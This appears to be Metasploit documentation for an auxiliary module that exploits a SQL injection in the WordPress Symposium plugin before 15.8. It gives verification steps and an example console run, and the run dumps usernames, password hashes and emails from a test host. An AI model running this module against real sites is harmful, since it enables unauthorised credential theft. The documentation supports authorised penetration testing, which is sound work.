## Vulnerable Application

  The auxiliary/admin/http/wp_symposium_sql_injection works for WordPress
  Symposium plugin before 15.8. The Pro module version has not been verified.

  To download the vulnerable application, you can find it here:
  https://github.com/wp-plugins/wp-symposium/archive/15.5.1.zip

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/admin/http/wp_symposium_sql_injection```
  3. Do: ```set RHOST <ip>```
  4. Set TARGETURI if necessary.
  5. Do: ```run```

## Scenarios

  Example run against WordPress Symposium plugin 15.5.1:

  ```
  msf > use auxiliary/admin/http/wp_symposium_sql_injection
  msf auxiliary(wp_symposium_sql_injection) > show info

         Name: WordPress Symposium Plugin SQL Injection
       Module: auxiliary/admin/http/wp_symposium_sql_injection
      License: Metasploit Framework License (BSD)
         Rank: Normal
    Disclosed: 2015-08-18

  Provided by:
    PizzaHatHacker
    Matteo Cantoni <goony@nothink.org>

  Basic options:
    Name        Current Setting  Required  Description
    ----        ---------------  --------  -----------
    Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOST                        yes       The target address
    RPORT       80               yes       The target port
    SSL         false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI   /                yes       The base path to the wordpress application
    URI_PLUGIN  wp-symposium     yes       The WordPress Symposium Plugin URI
    VHOST                        no        HTTP server virtual host

  Description:
    SQL injection vulnerability in the WP Symposium plugin before 15.8
    for WordPress allows remote attackers to execute arbitrary SQL
    commands via the size parameter to get_album_item.php.

  References:
    http://cvedetails.com/cve/2015-6522/
    https://www.exploit-db.com/exploits/37824

  msf auxiliary(wp_symposium_sql_injection) > set RHOST 1.2.3.4
  RHOST => 1.2.3.4
  msf auxiliary(wp_symposium_sql_injection) > set TARGETURI /html/wordpress/
  TARGETURI => /html/wordpress/
  msf auxiliary(wp_symposium_sql_injection) > run

  [+] 1.2.3.4:80 - admin           $P$ByvWm3Hb653Z50DskJVdUcZZbJ03dJ. admin.foobar@mail.xyz
  [+] 1.2.3.4:80 - pippo           $P$BuTaWvLcEBPseEWONBvihacEqpHa6M/ pippo.foobar@mail.xyz
  [+] 1.2.3.4:80 - pluto           $P$BJAoieYeeCDujy7SPQL1fjDULrtVJ3/ pluto.foobar@mail.xyz
  [*] Auxiliary module execution completed
  ```
